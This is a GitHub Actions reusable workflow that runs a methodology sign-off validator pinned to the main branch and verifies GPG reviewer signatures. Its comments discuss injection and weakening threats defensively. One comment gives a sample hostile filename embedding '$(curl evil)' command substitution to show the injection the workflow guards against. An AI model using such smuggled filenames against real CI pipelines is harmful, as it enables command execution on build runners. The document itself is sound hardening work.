name: Methodology Sign-off Validator (reusable)

# Reusable workflow that executes scripts/check_methodology_signoff.py
# against a sign-off / rejection artifact list. Issue #192 H3 PARTIAL
# mitigation: this workflow is invoked via `uses: ./.github/workflows/...`
# from the caller, which means GitHub loads BOTH the caller YAML AND
# this reusable workflow YAML from the caller's ref. The load-bearing
# defense is INSIDE this workflow's `actions/checkout@v4 ref: main`
# step which loads the validator SCRIPT from the protected ref — that
# closes script-only weakening (a PR that edits ONLY the validator
# script no longer affects the run, since the workflow runs main's copy
# of the script).
#
# IMPORTANT (codex pass-1 HIGH-1 + pass-2 MED-2 honesty correction):
#   The split does NOT close the "PR weakens validator + workflow in
#   same commit" attack class. A malicious PR can edit BOTH workflow
#   YAMLs in one commit and disable / replace the `ref: main` checkout
#   step that pins the validator script. Same-repo path-pinning expands
#   the trusted computing base from {validator script + caller YAML} to
#   {validator script + both workflow YAMLs}. Narrower than pre-#192,
#   not a complete close. See `docs/governance/n3_known_limitations_20260510.md`
#   item 3 for the residual-threats inventory.
#
# The PR's artifacts (the markdown sign-off / rejection files being
# validated) are still read from the caller-passed checkout, since the
# validator's job is to evaluate THE PR's content. Only the validator
# CODE comes from the protected ref.
#
# Cross-PR weakening attack (e.g. land a weakened validator on main first,
# then open the sign-off PR) is also NOT closed by this split alone — it
# requires CODEOWNERS gating on `scripts/check_methodology_signoff.py`
# AND on both workflow files. See the H3 SECURITY ADVISORY in
# `methodology_signoff_guard.yml` for the production migration path
# (move the validator to a separate `org/governance-actions` repo and
# pin by SHA — that's the only way to fully close both attack classes
# in a same-org same-repo world).
#
# Inputs:
#   * touched_files (string, required)
#       Newline-separated list of artifact paths to validate, relative to
#       the repo root (the PR-checkout workspace).
#   * strict_gh (string, optional, default: '1')
#       When '1', the validator's --strict-gh flag is set (issue #192
#       H2/M1 fail-closed escalation: provenance_check_skipped=True
#       becomes exit code 3 / hard fail rather than warning). Caller may
#       pass '0' to opt out for early-stage / dev contexts.
#   * strict_gpg (string, optional, default: '1')
#       Issue #226 H1+H4. When '1', the validator's --strict-gpg flag is
#       set: signature_check_skipped=True (no CoI body signature found,
#       OR the keyring directory is missing/empty) becomes exit code 4 /
#       hard fail rather than warning. Caller may pass '0' to opt out for
#       early-stage / dev contexts where the GPG_REVIEWER_KEYS_ARMOR_BASE64
#       repo secret has not yet been provisioned.
#
# Required secrets (issue #226 H1+H4):
#   * GPG_REVIEWER_KEYS_ARMOR_BASE64 (optional but REQUIRED for STRICT_GPG=1)
#       Base64-encoded concatenation of ASCII-armor reviewer pubkey
#       exports. Operator runs:
#           cat key1.asc key2.asc ... > reviewer-bundle.asc
#           base64 -w0 reviewer-bundle.asc | gh secret set GPG_REVIEWER_KEYS_ARMOR_BASE64
#       The keyring-import step below imports these into a per-job
#       $KEYRING_DIR via `gpg --homedir "$KEYRING_DIR" --import`. When
#       the secret is unset AND STRICT_GPG=1, the keyring-import step
#       exits 4 (the validator's reserved exit code for keyring-missing-
#       under-strict). When the secret is unset AND STRICT_GPG=0, the
#       step warns and the validator runs in advisory mode. See
#       docs/governance/operator_gpg_keyring_setup.md for the operator
#       handoff workflow.
#
# NOTE on validator_ref (codex pass-2 LOW-1 fix): the protected ref the
# validator script is loaded from is now HARDCODED to 'main' inside this
# workflow rather than exposed as a caller-controlled input. This
# eliminates a footgun where a future caller could accidentally pass a
# non-protected ref. To re-introduce a ref override for testing /
# dispatch, gate it behind an explicit `workflow_dispatch` block (NOT
# `workflow_call`) so PR-controlled callers can never set it.

on:
  workflow_call:
    inputs:
      touched_files:
        description: 'Newline-separated list of methodology artifact paths to validate.'
        required: true
        type: string
      strict_gh:
        description: '"1" to pass --strict-gh to the validator (fail-closed on missing gh provenance). Default "1".'
        required: false
        type: string
        default: '1'
      strict_gpg:
        description: '"1" to pass --strict-gpg to the validator (fail-closed on missing keyring or missing CoI body signature). Default "1". Issue #226 H1+H4.'
        required: false
        type: string
        default: '1'
    secrets:
      GPG_REVIEWER_KEYS_ARMOR_BASE64:
        description: 'Base64 (-w0) armored reviewer GPG public-key bundle for the verification keyring. Optional; STRICT_GPG=1 fails closed when unset, STRICT_GPG=0 degrades to advisory. Explicitly declared so the caller passes only this secret (least privilege) instead of secrets inherit.'
        required: false

# Codex pass-2 LOW-1 fix: hardcode the protected validator ref. Caller
# workflows can no longer override this via input. If the protected
# branch ever needs to change, edit this value here in a CODEOWNERS-
# gated change.
env:
  VALIDATOR_PROTECTED_REF: 'main'

permissions:
  # Least-privilege: validator only needs to read PR metadata + repo
  # contents. NEVER grant write here — the validator is a guard, not a
  # mutator. Issue #192 H2/M1: pull-requests:read enables the validator's
  # gh-CLI provenance queries via the auto-provisioned GITHUB_TOKEN.
  contents: read
  pull-requests: read

jobs:
  validate:
    name: Validate Methodology Sign-off (reusable)
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR head (artifacts under validation)
        uses: actions/checkout@v4
        with:
          # Full history needed so `git log --author=...` evaluations in
          # check_methodology_signoff.py see the full commit graph for the
          # named period.
          fetch-depth: 0
          path: pr-checkout

      - name: Checkout protected validator ref (issue #192 H3)
        uses: actions/checkout@v4
        with:
          # Issue #192 H3: load the validator script from the protected
          # ref (HARDCODED 'main' via env.VALIDATOR_PROTECTED_REF) into
          # a SEPARATE workspace. This closes script-only weakening
          # (a PR that edits ONLY the validator script no longer affects
          # the run). It does NOT close same-commit dual-edit of both
          # workflow YAMLs — see the IMPORTANT comment block at the top
          # of this file.
          # Codex pass-2 LOW-1 fix: ref is no longer caller-controlled.
          ref: ${{ env.VALIDATOR_PROTECTED_REF }}
          fetch-depth: 1
          path: validator-source
          # Sparse checkout: we only need the validator script. Avoids
          # carrying the full repo into the validator workspace and makes
          # the threat surface explicit (only this file matters).
          sparse-checkout: |
            scripts/check_methodology_signoff.py
          sparse-checkout-cone-mode: false

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Verify validator source provenance
        working-directory: validator-source
        run: |
          set -euo pipefail
          # Defensive log: surface which ref the validator was loaded from
          # so audit logs can reconstruct the protection state. Issue #192
          # H3: the SHA below MUST be an ancestor of the PR's merge base
          # OR equal to the protected branch HEAD. CI does not enforce
          # the ancestry check (would require gh + token + complex logic
          # to handle force-pushes); branch protection on `main` is the
          # primary defense.
          # VALIDATOR_PROTECTED_REF is set at workflow level (codex pass-2
          # LOW-1 hardcode); read directly from env.
          VALIDATOR_SHA=$(git rev-parse HEAD)
          echo "validator_ref=${VALIDATOR_PROTECTED_REF}"
          echo "validator_sha=${VALIDATOR_SHA}"
          echo "validator_path=scripts/check_methodology_signoff.py"
          if [ ! -f scripts/check_methodology_signoff.py ]; then
            echo "::error::validator script not found at protected ref ${VALIDATOR_PROTECTED_REF}@${VALIDATOR_SHA}"
            exit 1
          fi
          # Compute and log the validator's content SHA so post-incident
          # forensics can verify which version of the script ran.
          sha256sum scripts/check_methodology_signoff.py
          echo "validator_sha=${VALIDATOR_SHA}" >> "$GITHUB_OUTPUT"
        id: validator_provenance

      - name: Provision GPG keyring (issue #226 H1+H4)
        # Imports reviewer pubkeys from the
        # GPG_REVIEWER_KEYS_ARMOR_BASE64 repo secret into a per-job
        # $KEYRING_DIR. The validator's --keyring-dir flag is wired to
        # that path in the next step. When the secret is unset AND
        # STRICT_GPG=1, this step exits 4 (the validator's reserved
        # exit code for keyring-missing-under-strict). When the secret
        # is unset AND STRICT_GPG=0, it warns and downstream signature
        # checks degrade to advisory mode.
        env:
          # Issue #225 codex HIGH-2 lesson + issue #226: route the
          # secret through `env:` so bash treats it as data, never as
          # code. Direct ${{ secrets.* }} interpolation into a here-
          # string would be a shell-injection sink (a malicious actor
          # with secret-write access could craft a payload that
          # executes via base64 -d | sh, but routing via env: shifts
          # the value into a shell variable bash treats as data).
          GPG_REVIEWER_KEYS_ARMOR_BASE64: ${{ secrets.GPG_REVIEWER_KEYS_ARMOR_BASE64 }}
          STRICT_GPG: ${{ inputs.strict_gpg }}
        run: |
          set -euo pipefail
          KEYRING_DIR="${RUNNER_TEMP:-/tmp}/methodology-keyring"
          mkdir -p "$KEYRING_DIR"
          chmod 700 "$KEYRING_DIR"

          # Smoke-test gpg toolchain. Ubuntu runners ship gpg by
          # default; this is defensive logging.
          if ! command -v gpg >/dev/null 2>&1; then
            echo "::error::gpg not on PATH on this runner — cannot provision keyring"
            if [ "$STRICT_GPG" = "1" ]; then
              exit 4
            fi
            echo "::warning::STRICT_GPG=0 — falling back to advisory-only signature checks"
            echo "KEYRING_DIR=$KEYRING_DIR" >> "$GITHUB_ENV"
            exit 0
          fi

          # GPG_REVIEWER_KEYS_ARMOR_BASE64 secret must carry a base64-
          # encoded ASCII-armor multi-key bundle. See
          # docs/governance/operator_gpg_keyring_setup.md for the
          # operator workflow.
          if [ -z "${GPG_REVIEWER_KEYS_ARMOR_BASE64:-}" ]; then
            echo "::warning::GPG_REVIEWER_KEYS_ARMOR_BASE64 secret is NOT set"
            if [ "$STRICT_GPG" = "1" ]; then
              echo "::error::STRICT_GPG=1 and keyring secret missing — failing closed (exit 4 reserved for issue #226 H1+H4)"
              exit 4
            fi
            echo "::warning::STRICT_GPG=0 — falling back to advisory-only signature checks"
            echo "KEYRING_DIR=$KEYRING_DIR" >> "$GITHUB_ENV"
            exit 0
          fi

          # Codex pass-1 MED-2 fix (2026-05-15): capture EVERY pipeline
          # status, not just `gpg --import`. The pre-fix
          # `IMPORT_RC=${PIPESTATUS[2]}` ignored `base64 -d` failure — if
          # base64 emits partial decoded output and exits non-zero, gpg
          # can still import partial key material and return 0. Fix:
          # snapshot all PIPESTATUS values, then require both the
          # decoder (PIPE_RC[1]) and gpg (PIPE_RC[2]) to succeed.
          # printf failure (PIPE_RC[0]) is also asserted defensively.
          set +e
          printf '%s' "$GPG_REVIEWER_KEYS_ARMOR_BASE64" | base64 -d | \
            gpg --homedir "$KEYRING_DIR" --batch --import 2>&1 | \
            tee /tmp/gpg_import.log
          PIPE_RC=("${PIPESTATUS[@]}")
          set -e
          PRINTF_RC="${PIPE_RC[0]}"
          BASE64_RC="${PIPE_RC[1]}"
          IMPORT_RC="${PIPE_RC[2]}"
          if [ "$PRINTF_RC" -ne 0 ] || [ "$BASE64_RC" -ne 0 ] || [ "$IMPORT_RC" -ne 0 ]; then
            echo "::error::keyring import pipeline failed (printf=${PRINTF_RC} base64=${BASE64_RC} gpg=${IMPORT_RC}); see /tmp/gpg_import.log"
            if [ "$STRICT_GPG" = "1" ]; then
              exit 4
            fi
            echo "::warning::STRICT_GPG=0 — falling back to advisory-only signature checks"
            echo "KEYRING_DIR=$KEYRING_DIR" >> "$GITHUB_ENV"
            exit 0
          fi

          echo "::group::Imported keys"
          gpg --homedir "$KEYRING_DIR" --batch --list-keys --with-fingerprint --keyid-format=long
          echo "::endgroup::"

          # Persist for downstream steps.
          echo "KEYRING_DIR=$KEYRING_DIR" >> "$GITHUB_ENV"

      - name: Run validator on each touched artifact
        env:
          # Issue #192 H2/M1: provision the GitHub-Actions auto-token so
          # the validator's `gh pr list` provenance queries succeed. The
          # permissions block above grants only pull-requests:read +
          # contents:read — strictly the minimum needed for the queries.
          GH_TOKEN: ${{ github.token }}
          # Issue #192 H2/M1: when STRICT_GH=1, the validator returns
          # exit code 3 if any check has provenance_check_skipped=True.
          # The caller defaults this to '1'; set '0' to opt out.
          STRICT_GH: ${{ inputs.strict_gh }}
          # Issue #226 H1+H4: when STRICT_GPG=1, the validator returns
          # exit code 4 if any check has signature_check_skipped=True
          # (no CoI body signature found, or keyring missing/empty).
          # The caller defaults this to '1'; set '0' to opt out.
          STRICT_GPG: ${{ inputs.strict_gpg }}
          # The selection-rule check shells out to git log; the
          # PR-checkout workspace is the natural --repo-root.
          REPO_ROOT: ${{ github.workspace }}/pr-checkout
          # Issue #192 codex pass-1 HIGH-2 fix: route the touched_files
          # input through `env` so it is exposed as a shell variable
          # *after* the shell has parsed the script. Direct
          # ${{ inputs.touched_files }} interpolation into a here-string
          # would be a shell-injection sink — a PR can add a file matching
          # the workflow's broad path glob with a name like
          # `optum_methodology_signoff_$(curl evil).md`; expression
          # substitution happens before bash parses the line, so the
          # command-substitution would execute. Routing through `env`
          # shifts the value into a shell variable that bash treats as
          # data, never as code. The validator's filename pattern
          # (FILENAME_PATTERN regex) rejects such filenames downstream,
          # but we MUST defend BEFORE invoking the validator.
          TOUCHED_FILES: ${{ inputs.touched_files }}
          # VALIDATOR_PROTECTED_REF is set at workflow level (codex
          # pass-2 LOW-1 hardcode) and inherits into this step's env.
          VALIDATOR_PATH_ABS: ${{ github.workspace }}/validator-source/scripts/check_methodology_signoff.py
          # Issue #226 H1+H4: KEYRING_DIR is exported by the
          # "Provision GPG keyring" step above (via $GITHUB_ENV) and
          # inherits into this step. Empty / missing means the keyring
          # was not provisioned (advisory mode); the validator's
          # check_keyring_present + check_coi_body_signature_verifies
          # branches handle both cases under the STRICT_GPG policy.
        working-directory: pr-checkout
        run: |
          set -euo pipefail

          # Smoke-test that gh is available + authenticated before we
          # invoke the validator. Issue #192 H2/M1: STRICT_GH=1 makes the
          # validator hard-fail when gh is unavailable; surface that
          # state explicitly here so the CI log shows why.
          if command -v gh >/dev/null 2>&1; then
            if gh auth status >/dev/null 2>&1; then
              echo "gh CLI: available + authenticated"
            else
              echo "::warning::gh CLI is on PATH but \`gh auth status\` failed; STRICT_GH=${STRICT_GH} may trigger validator exit 3"
            fi
          else
            echo "::warning::gh CLI is NOT on PATH on this runner; STRICT_GH=${STRICT_GH} may trigger validator exit 3"
          fi

          # Issue #192 codex pass-1 LOW-4 fix: preserve the validator's
          # exit-code-3 (STRICT_GH provenance gap) signal up to the job
          # exit code. Previously the `if ! python3 ...; then STATUS=1`
          # pattern collapsed every non-zero into 1, undercutting the
          # exit-code contract for log scrapers. The new approach uses
          # PIPESTATUS to capture the validator's actual exit code AND
          # picks the highest-priority code (1 wins over 3 wins over 0)
          # so a generic-validation-failure on one artifact still bubbles
          # up correctly even when a sibling artifact failed strict-gh.
          STATUS=0
          : > /tmp/validator_output.txt

          echo "Using validator from: ${VALIDATOR_PATH_ABS} (ref=${VALIDATOR_PROTECTED_REF})"

          # Issue #192 codex pass-1 HIGH-2 fix: iterate from the env-var
          # TOUCHED_FILES rather than from a here-string interpolated by
          # GitHub Actions expression substitution. This eliminates the
          # shell-injection vector entirely — bash never sees the input
          # text at parse time.
          while IFS= read -r ARTIFACT; do
            [ -z "$ARTIFACT" ] && continue
            echo "::group::Validating $ARTIFACT"
            # Run validator from the protected-ref source against the
            # PR-checkout artifact. --strict-gh is set via STRICT_GH env
            # var (the validator honors both CLI flag and env).
            #
            # Codex pass-2 MED-1 fix: under `set -euo pipefail`, the bare
            # `python3 ... | tee ...` pipeline EXITS THE SHELL on any
            # non-zero validator rc, BEFORE the next line can read
            # PIPESTATUS. We bracket the pipeline with `set +e` / `set -e`
            # so the rc reaches the priority logic. PIPESTATUS[0] is the
            # validator's exit (PIPESTATUS[1] is tee's, which we ignore).
            set +e
            # Issue #226 H1+H4: pass --keyring-dir when KEYRING_DIR was
            # set by the "Provision GPG keyring" step above. We build
            # the args list defensively so the empty-keyring-dir case
            # does NOT pass --keyring-dir "" (which gpg would interpret
            # as a literal cwd-relative homedir).
            VALIDATOR_ARGS=(--repo-root "$REPO_ROOT" --require-signature)
            if [ -n "${KEYRING_DIR:-}" ] && [ -d "${KEYRING_DIR}" ]; then
              VALIDATOR_ARGS+=(--keyring-dir "$KEYRING_DIR")
            fi
            VALIDATOR_ARGS+=("$ARTIFACT")
            python3 "${VALIDATOR_PATH_ABS}" \
                  "${VALIDATOR_ARGS[@]}" 2>&1 | tee -a /tmp/validator_output.txt
            ARTIFACT_RC=${PIPESTATUS[0]}
            set -e
            if [ "$ARTIFACT_RC" -ne 0 ]; then
              echo "::error file=$ARTIFACT::methodology sign-off validation failed (rc=$ARTIFACT_RC; rc=3 = STRICT_GH provenance gap; rc=4 = STRICT_GPG keyring/CoI-sig gap)"
              # Codex pass-2 MED-1 fix: explicit precedence with -eq
              # comparisons (the prior `-gt` was wrong — `3 -gt 1` is
              # true, so a later rc=1 would NOT overwrite an earlier
              # rc=3 even though we want rc=1 to win).
              # Priority (mirrors Python main()):
              #   rc=1 (generic validation fail) > rc=3 (strict-gh) >
              #   rc=4 (strict-gpg) > rc=0.
              # Issue #226: rc=4 is reserved for keyring/CoI-sig gaps
              # under STRICT_GPG. Same precedence pattern as rc=3 — a
              # generic validation failure (rc=1) on any sibling artifact
              # still wins, but rc=4 wins over rc=0.
              if [ "$ARTIFACT_RC" -eq 1 ]; then
                STATUS=1
              elif [ "$ARTIFACT_RC" -eq 3 ] && [ "$STATUS" -ne 1 ]; then
                STATUS=3
              elif [ "$ARTIFACT_RC" -eq 4 ] && [ "$STATUS" -eq 0 ]; then
                STATUS=4
              elif [ "$ARTIFACT_RC" -ne 0 ] && [ "$STATUS" -eq 0 ]; then
                # Any other non-zero (e.g. rc=2 invocation error) only
                # wins when STATUS is still 0; never overwrites 1, 3, 4.
                STATUS="$ARTIFACT_RC"
              fi
            fi
            echo "::endgroup::"
          done <<< "$TOUCHED_FILES"

          # iter-3 M1: surface the CRITICAL provenance-skip marker even
          # when STRICT_GH=0 (back-compat path). When STRICT_GH=1, the
          # validator already exited 3 above; this echo is informational.
          if grep -q "CRITICAL: gh provenance query SKIPPED" \
              /tmp/validator_output.txt; then
            echo "::warning::CRITICAL: gh provenance query was SKIPPED on at least one artifact. STRICT_GH=${STRICT_GH}; if 1, the validator exited 3."
          fi

          exit "$STATUS"

      - name: Summary
        if: always()
        env:
          # Issue #192 codex pass-1 HIGH-2 hardening: route every input
          # through env so the Summary step (which writes to
          # GITHUB_STEP_SUMMARY) is also free of GitHub-Actions
          # expression-substitution sinks. VALIDATOR_PROTECTED_REF
          # inherits from workflow-level env (codex pass-2 LOW-1).
          STRICT_GH: ${{ inputs.strict_gh }}
          STRICT_GPG: ${{ inputs.strict_gpg }}
          TOUCHED_FILES: ${{ inputs.touched_files }}
        run: |
          {
            echo "## Methodology Sign-off Guard"
            echo ""
            echo "**Validator source ref:** \`${VALIDATOR_PROTECTED_REF}\` (issue #192 H3, hardcoded)"
            echo "**STRICT_GH:** \`${STRICT_GH}\` (issue #192 H2/M1)"
            echo "**STRICT_GPG:** \`${STRICT_GPG}\` (issue #226 H1+H4)"
            if [ -n "${KEYRING_DIR:-}" ] && [ -d "${KEYRING_DIR}" ]; then
              echo "**Keyring:** provisioned at \`${KEYRING_DIR}\`"
            else
              echo "**Keyring:** NOT provisioned (advisory mode unless STRICT_GPG=1)"
            fi
            echo ""
            echo "Artifacts validated:"
            echo ""
            echo '```'
            printf '%s\n' "$TOUCHED_FILES"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"
